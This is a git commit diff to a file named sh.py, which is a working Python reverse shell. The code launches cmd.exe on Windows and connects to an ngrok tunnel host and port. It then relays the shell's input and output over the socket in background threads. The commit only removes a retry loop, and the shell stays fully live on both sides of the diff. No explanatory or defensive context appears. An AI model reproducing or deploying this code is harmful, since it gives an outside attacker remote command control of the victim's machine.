880ee0d79669f291cc0e32504746bfbf93b59683
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 00:20:37 +0300

    Update sh.py

--- sh.py
+++ sh.py
@@ -1,9 +1,7 @@
 import socket,os,threading,subprocess as sp
-while True: 
-        try:
-            p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
-            s=socket.socket()
-            s.connect(('6.tcp.eu.ngrok.io',10406))
-            threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
-            threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
+p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
+s=socket.socket()
+s.connect(('6.tcp.eu.ngrok.io',10406))
+threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
+threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
       
